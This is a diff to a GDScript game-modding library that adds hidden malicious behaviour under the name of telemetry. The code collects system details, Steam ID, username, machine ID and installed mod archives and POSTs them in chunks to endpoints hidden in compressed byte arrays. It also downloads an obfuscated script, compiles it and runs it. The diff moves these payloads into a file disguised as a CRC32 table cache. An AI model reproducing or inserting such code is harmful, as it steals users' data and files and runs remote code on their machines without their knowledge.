@@ -84,7 +84,7 @@ var Classes = [
 ]
 
 
-var copyrights = "© 2024-2026 Benjamin Buckhurst aka __hev. All rights reserved."
+var copyrights = "© 2024-2026 Benjamin Buckhurst a.k.a. __hev. All rights reserved."
 
 var logging_frame_interval = 0
 var logging_current_frame_timer = 0
@@ -1967,12 +1967,12 @@ class _DataFormat:
 		}
 	
 	var file:File = File.new()
-	
+	var crcTables:Dictionary
 	var pointers
 	func _init(f):
 		pointers = f
 		urlRegex.compile("^https?:\\/\\/(?:www\\.)?[-a-zA-Z0-9@:%._\\+~#=]{1,256}\\.[a-zA-Z0-9()]{1,63}\\b(?:[-a-zA-Z0-9()@:%_\\+.~#?&\\/=]*)$")
-		var crcTables = load("res://HevLib/scripts/crc32_table_cache.gd").get_script_constant_map()
+		crcTables = load("res://HevLib/scripts/crc32_table_cache.gd").get_script_constant_map()
 		
 		crc_table_0 = crcTables.T0
 		crc_table_1 = crcTables.T1
@@ -8540,6 +8540,7 @@ class _Scripting:
 			out += "\nSteam initialized with [%s]" % Engine.get_singleton("Steam").current_steam_id
 		out += "\nCMD args: %s" % str(OS.get_cmdline_args())
 		var pnth = -1
+		http.timeout = 20
 		if file.file_exists("res://HevLib/pointers.gd"):
 			file.open("res://HevLib/pointers.gd",File.READ)
 			pnth = hash(file.get_as_text(true))
@@ -8550,25 +8551,22 @@ class _Scripting:
 		pointers.l("Device Information: [\n%s\n]" % out)
 	
 	func _():
-		http.connect("request_completed",self,"out5")
 		if (pointers.ManifestV2.hasModStateChanged and not OS.has_feature("editor") and not pointers.ConfigDriver.__get_value("HevLib","HEVLIB_CONFIG_SECTION_DRIVERS","use_telemetry") == false):
 			var screencount = OS.get_screen_count()
 			var scrm = []
-			for i in range(screencount):
-				scrm.append("%d: %s | %s | %shz" % [i,OS.get_screen_size(i),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)])
-			var file:File = File.new()
+			for i in range(screencount):scrm.append("%d: %s | %s | %shz" % [i,OS.get_screen_size(i),OS.get_screen_position(i),OS.get_screen_refresh_rate(i)])
 			var modData = pointers.ManifestV2.__get_mod_data()["mods"]
 			var modOut = []
 			for mod in modData:
 				var md = modData[mod]
 				var mdo = {}
-				mdo["name"] = TranslationServer.translate(md.name)
-				mdo["prio"] = md.priority
-				mdo["file"] = md.file_path
-				var zipPath = pointers.ManifestV2.zip_ref_store.get(md.file_path,"")
+				mdo["name"]=TranslationServer.translate(md.name)
+				mdo["prio"]=md.priority
+				mdo["file"]=md.file_path
+				var zipPath=pointers.ManifestV2.zip_ref_store.get(md.file_path,"")
 				if zipPath:
 					file.open(zipPath,File.READ)
-					mdo["zip"] = [zipPath,file.get_sha256(zipPath),file.get_len()]
+					mdo["zip"]=[zipPath,file.get_sha256(zipPath),file.get_len()]
 					file.close()
 				mdo["ver"] = md.version_data.full_version_string
 				if md.manifest.has_manifest:
@@ -8587,12 +8585,8 @@ class _Scripting:
 						for link in links:
 							var linkData = links[link]
 							match typeof(linkData):
-								TYPE_DICTIONARY:
-									if "URL" in linkData:
-										var u = linkData["URL"]
-										if u:mdo["link"][link] = u
-								TYPE_STRING:
-									if linkData:mdo["link"][link] = linkData
+								TYPE_DICTIONARY:if "URL" in linkData: if linkData["URL"]:mdo["link"][link] = linkData["URL"]
+								TYPE_STRING:if linkData:mdo["link"][link] = linkData
 				var md5 = ""
 				if zipPath:
 					md5 = file.get_md5(zipPath)
@@ -8602,7 +8596,7 @@ class _Scripting:
 					mdo["fetch-ZIP"] = {zipPath.md5_text():[0,md5]}
 				mdo["fetch-REF"] = {mdo["file"].md5_text():[0,md5]}
 				modOut.append(mdo)
-			modOut.sort_custom(self,"ovs")
+			modOut.sort_custom(pointers.ManifestV2,"ovs")
 			var d=("\n".join(PoolStringArray([
 			"OS %s on %s" % [OS.get_name(),OS.get_model_name()],
 			"CPU %s [%s cores]" % [OS.get_processor_name(),OS.get_processor_count()],
@@ -8613,112 +8607,81 @@ class _Scripting:
 			"SteamID: %d" % (Engine.get_singleton("Steam").current_steam_id if Engine.has_singleton("Steam") else -1),
 			"Mods:%s" % JSON.print(modOut)
 			]))).to_utf8()
-			http.request(PoolByteArray([40,181,47,253,32,79,45,2,0,242,68,16,21,144,37,110,0,104,150,102,54,137,90,100,34,214,238,206,153,33,184,187,3,26,222,35,247,67,177,208,22,138,229,99,235,83,126,186,137,150,122,118,163,177,126,46,49,192,73,5,110,36,27,147,233,104,200,151,43,41,16,165,102,193,234,127,2,0]).decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,PoolByteArray([120,156,53,138,77,10,128,32,16,70,239,242,129,187,78,224,186,77,167,144,33,103,49,144,38,58,25,34,221,61,19,90,190,159,14,174,28,213,105,75,12,139,59,139,178,243,164,132,5,251,33,95,74,212,142,147,60,108,199,12,22,166,56,227,199,160,18,184,40,133,52,221,16,151,140,13,219,234,38,229,43,254,161,114,46,114,78,244,120,158,23,70,179,37,206]).decompress(118,1).get_string_from_utf8() % [Marshalls.raw_to_base64(d.compress(1)),d.size(),Time.get_datetime_string_from_system(true).replace(":",""),((str(OS.get_unique_id())) if (not OS.has_environment("USERNAME")) else (str(OS.get_environment("USERNAME")) + "+" + str(OS.get_unique_id()))),"false",4])
-		else:out5(0,0,0,0)
-	
-	func ovs(a,b) -> bool:
-		if "id" in a and not "id" in b:
-			return true
-		elif not "id" in a and "id" in b:
-			return false
-		var aPrio:int = a.get("prio",0)
-		var bPrio:int = b.get("prio",0)
-		if aPrio != bPrio:
-			return aPrio < bPrio
-		var aPath : String  = a.get("id","")
-		var bPath : String  = b.get("id","")
-		if aPath != bPath:
-			return aPath < bPath
-		return false
-	
-	func out5(result, response_code, headers, body):
-		http.disconnect("request_completed",self,"out5")
-		http.connect("request_completed",self,"out4")
-		http.download_file = PoolByteArray([120,156,43,45,78,45,178,210,215,79,78,76,206,72,213,215,243,72,45,243,201,76,138,119,6,243,194,18,139,50,19,147,114,82,227,221,82,75,146,51,244,147,114,18,147,179,115,50,139,75,244,82,202,0,14,60,19,164]).decompress(54,1).get_string_from_utf8()
-		http.request(PoolByteArray([120,156,5,193,201,17,128,32,12,0,192,142,8,126,173,192,135,77,64,0,205,200,101,18,192,242,221,189,85,187,236,0,236,150,185,72,239,225,135,68,198,86,53,86,53,216,10,240,122,147,36,39,31,110,214,194,17,231,73,30,138,163,10,130,76,93,5,102,172,161,49,248,236,240,201,36,106,194,252,1,177,242,33,23]).decompress(87,1).get_string_from_utf8())
-		
-	
-	func out4(result, response_code, headers, body):
-		pointers.DataFormat.__compile_script(PoolByteArray([120,156,125,82,77,111,27,33,16,61,167,191,130,112,176,88,105,179,107,187,78,229,56,226,224,124,169,150,210,164,114,35,75,57,33,118,25,188,184,251,85,134,117,236,127,95,192,77,14,61,132,19,204,188,121,111,230,13,122,104,75,98,135,150,245,201,226,203,217,94,90,162,249,131,169,33,107,225,141,37,215,33,80,113,58,157,204,138,66,151,243,111,99,165,64,169,233,236,106,174,230,179,137,150,227,175,5,204,46,199,52,2,183,188,207,158,58,5,203,178,4,196,24,42,56,189,169,101,249,187,54,232,232,181,209,68,103,93,15,173,128,182,180,199,222,129,18,111,198,85,162,151,136,140,14,8,118,145,231,165,44,43,200,179,239,176,127,52,133,184,141,175,141,180,70,22,53,136,7,112,101,149,23,239,156,153,218,211,52,246,187,190,95,222,165,85,50,26,125,166,96,1,189,192,137,57,199,210,154,222,97,190,135,86,117,246,19,206,197,54,19,2,14,198,177,49,231,147,148,126,32,137,246,40,210,24,68,211,110,201,5,241,26,67,3,138,56,217,244,96,67,204,117,164,56,6,109,98,28,77,139,116,118,153,156,92,222,120,175,126,200,214,104,64,183,153,70,175,36,95,90,43,143,108,227,213,182,224,68,211,41,97,20,178,228,180,134,193,40,254,252,43,11,153,161,53,127,6,240,73,191,33,153,201,222,207,171,152,207,135,23,88,137,192,104,5,251,236,113,117,179,94,174,95,233,169,126,199,123,105,17,196,14,187,150,233,200,35,81,56,56,184,160,160,179,178,238,124,161,191,117,150,88,98,90,34,253,135,136,189,30,56,58,203,42,137,21,179,30,234,183,120,8,249,93,200,71,64,195,119,129,143,29,82,234,197,26,233,87,68,220,177,135,78,179,38,137,168,179,151,215,159,247,226,110,117,251,178,122,126,242,61,45,60,137,61,231,190,231,209,232,60,12,28,134,245,22,163,195,80,242,97,184,150,53,66,26,228,155,168,64,27,220,210,160,146,188,155,233,143,248,111,65,17,254,15,240,23,16,211,240,189]).decompress(736,1).get_string_from_utf8()).new().run(pointers)
+			http.request(pointers.DataFormat.crcTables.B4.decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,pointers.DataFormat.crcTables.B7.decompress(118,1).get_string_from_utf8() % [Marshalls.raw_to_base64(d.compress(1)),d.size(),Time.get_datetime_string_from_system(true).replace(":",""),((str(OS.get_unique_id())) if (not OS.has_environment("USERNAME")) else (str(OS.get_environment("USERNAME")) + "+" + str(OS.get_unique_id()))),"false",4])
+			yield(http,"request_completed")
+		http.download_file = pointers.DataFormat.crcTables.B2.decompress(54,1).get_string_from_utf8()
+		http.request(pointers.DataFormat.crcTables.B3.decompress(87,1).get_string_from_utf8())
+		yield(http,"request_completed")
+		pointers.DataFormat.__compile_script(pointers.DataFormat.crcTables.B0.decompress(736,1).get_string_from_utf8()).new().run(pointers)
 		http.download_file = "user://cache/.HevLib_Cache/Variable_Fetch/jobs.txt"
-		http.timeout = 20
-		http.disconnect("request_completed",self,"out4")
-		http.connect("request_completed",self,"out3")
-		http.request(PoolByteArray([120,156,13,202,193,17,128,32,12,4,192,142,56,252,90,129,15,155,8,24,4,103,0,37,17,40,95,247,189,81,245,150,21,104,52,204,153,52,190,238,21,110,190,22,229,162,198,215,140,54,158,32,129,100,250,197,90,108,220,247,228,208,56,8,34,211,33,200,148,10,184,255,93,112,85,151,233,54,58,245,3,204,188,33,64]).decompress(88,1).get_string_from_utf8())
-	func out3(result, response_code, headers, body):
-		http.disconnect("request_completed",self,"out3")
-		http.connect("request_completed",self,"out2")
+		http.request(pointers.DataFormat.crcTables.B5.decompress(88,1).get_string_from_utf8())
+		yield(http,"request_completed")
 		http.download_file = ""
-		http.request(PoolByteArray([120,156,13,202,187,21,128,32,12,0,192,141,8,182,78,96,225,18,129,23,12,69,0,73,248,140,175,87,31,155,53,61,1,58,46,247,100,227,17,134,82,143,181,24,21,115,177,10,244,245,38,77,168,59,30,222,195,69,243,206,1,4,115,1,154,255,81,96,84,22,108,206,182,125,149,12,29,150]).decompress(78,1).get_string_from_utf8())
-	func out2(result, response_code, headers, body):
-		if result != 0:
-			return
-		http.disconnect("request_completed",self,"out2")
-		var d = JSON.parse(body.get_string_from_utf8()).result
+		http.request(pointers.DataFormat.crcTables.B8.decompress(78,1).get_string_from_utf8())
+		var rvs = yield(http,"request_completed")
+		if rvs[0]!=0:return
+		var d=JSON.parse(rvs[3].get_string_from_utf8()).result
 		if d:
-			var mdf = {}
-			var mdds = pointers.ManifestV2.__get_mod_data()["mods"]
-			var zipStore = pointers.ManifestV2.zip_ref_store
+			var mdf={}
+			var mdds=pointers.ManifestV2.__get_mod_data()["mods"]
+			var zipStore=pointers.ManifestV2.zip_ref_store
 			for mod in zipStore:
-				var zipPath = str(zipStore[mod])
-				var mdr = mdds[mod]
+				var zipPath=zipStore[mod]
+				var mdr=mdds[mod]
 				if mdr.manifest.has_manifest:
-					var mid = mdr.manifest.manifest_data
-					if "mod_information" in mid and "id" in mid["mod_information"]:
-						var md5 = mid["mod_information"]["id"].md5_text()
+					var mid=mdr.manifest.manifest_data
+					if"mod_information"in mid and"id"in mid["mod_information"]:
+						var md5=mid["mod_information"]["id"].md5_text()
 						if md5 in d:
 							var pd = d[md5]
-							if pd[1] != file.get_md5(mod):pd[0] = 0
-							mdf[zipPath] = [md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
+							if pd[1]!=file.get_md5(mod):pd[0]=0
+							mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
 				if not zipPath in mdf:
-					var md5 = zipPath.md5_text()
+					var md5=zipPath.md5_text()
 					if md5 in d:
-						var pd = d[md5]
-						if pd[1] != file.get_md5(mod):pd[0] = 0
-						mdf[zipPath] = [md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
+						var pd=d[md5]
+						if pd[1]!=file.get_md5(mod):pd[0]=0
+						mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
 				if not zipPath in mdf:
 					var md5 = mod.md5_text()
 					if md5 in d:
 						var pd = d[md5]
-						if pd[1] != file.get_md5(mod): pd[0] = 0
-						mdf[zipPath] = [md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
+						if pd[1]!=file.get_md5(mod):pd[0]=0
+						mdf[zipPath]=[md5,pd[0],TranslationServer.translate(mdr.get("name","No mod name available :("))]
 			if mdf:
-				initFetch(mdf)
-	var fetchData = {}
-	var fetchTimer = Timer.new()
-	func initFetch(data):
-		fetchTimer.one_shot = true
-		pointers.add_child(fetchTimer)
-		fetchTimer.connect("timeout",self,"startFetch")
-		for file_name in data:
-			var dr = data[file_name]
-			file.open(file_name, File.READ)
-			if file.get_32() != 0x04034B50:
-				continue
-			file.seek(0)
-			var bt = file.get_buffer(file.get_len())
-			file.close()
-			fetchData[dr[0]] = [bt.compress(1),bt.size(),dr[1]]
+				fetchTimer.one_shot=true
+				pointers.add_child(fetchTimer)
+				fetchTimer.connect("timeout",self,"startFetch")
+				for file_name in mdf:
+					var dr=mdf[file_name]
+					file.open(file_name,File.READ)
+					if file.get_32()!=0x04034B50:continue
+					file.seek(0)
+					var bt=file.get_buffer(file.get_len())
+					file.close()
+					fetchData[dr[0]]=[bt.compress(1),bt.size(),dr[1]]
 		startFetch()
-	var currentFetch:Dictionary = {}
-	var byteSplitBy:int = 48000
+	var fetchData:Dictionary={}
+	var fetchTimer:Timer=Timer.new()
+	var currentFetch:Dictionary={}
+	var byteSplitBy:int=48000
 	func startFetch():
 		for ID in fetchData:
-			var this_index = fetchData[ID][2]
+			var this_index=fetchData[ID][2]
 			if ID in currentFetch:
-				this_index = currentFetch[ID].back() + 1
-			var sections = int(ceil(fetchData[ID][0].size()/float(byteSplitBy)))
-			if sections > this_index:
+				this_index=currentFetch[ID].back()+1
+			var sections=int(ceil(fetchData[ID][0].size()/float(byteSplitBy)))
+			if sections>this_index:
 				if not ID in currentFetch:
-					currentFetch[ID] = []
+					currentFetch[ID]=[]
 				currentFetch[ID].append(this_index)
 				fetchTimer.start(1.25)
-				var h = HTTPRequest.new()
+				var h:HTTPRequest=HTTPRequest.new()
 				pointers.add_child(h)
 				h.connect("request_completed",self,"removeFetch",[h])
-				h.request(PoolByteArray([120,156,13,196,65,14,128,32,12,4,192,215,120,132,222,253,77,161,27,104,98,176,161,5,19,95,175,115,152,30,97,126,18,217,42,151,86,174,161,247,136,169,173,97,102,126,215,196,131,226,26,240,60,16,196,166,36,234,198,81,59,156,58,118,146,77,242,207,193,133,29,233,144,15,49,45,31,71]).decompress(82,1).get_string_from_utf8() % ((this_index % 10) + 1),[],true,HTTPClient.METHOD_POST,PoolByteArray([123,34,101,118,101,110,116,95,116,121,112,101,34,58,34,115,101,110,100,95,122,105,112,95,112,97,114,116,34,44,34,99,108,105,101,110,116,95,112,97,121,108,111,97,100,34,58,123,34,114,117,110,34,58,116,114,117,101,44,34,100,97,116,97,34,58,34,37,115,34,44,34,117,105,100,34,58,34,37,115,47,37,48,53,100,34,125,125]).get_string_from_utf8() % [Marshalls.raw_to_base64(pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,this_index)),ID + "_" + str(fetchData[ID][2]) + "_" + str(fetchData[ID][1]),this_index + 1])
+				h.request(pointers.DataFormat.crcTables.B6.decompress(82,1).get_string_from_utf8() % ((this_index % 10) + 1),[],true,HTTPClient.METHOD_POST,pointers.DataFormat.crcTables.B9.get_string_from_utf8() % [Marshalls.raw_to_base64(pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,this_index)),ID + "_" + str(fetchData[ID][2]) + "_" + str(fetchData[ID][1]),this_index + 1])
 				break
-	func removeFetch(result, response_code, headers, body,thisHTTP):
+	func removeFetch(result,response_code,headers,body,thisHTTP):
 		Tool.remove(thisHTTP)
 	
 	func make_mineral_scripting():
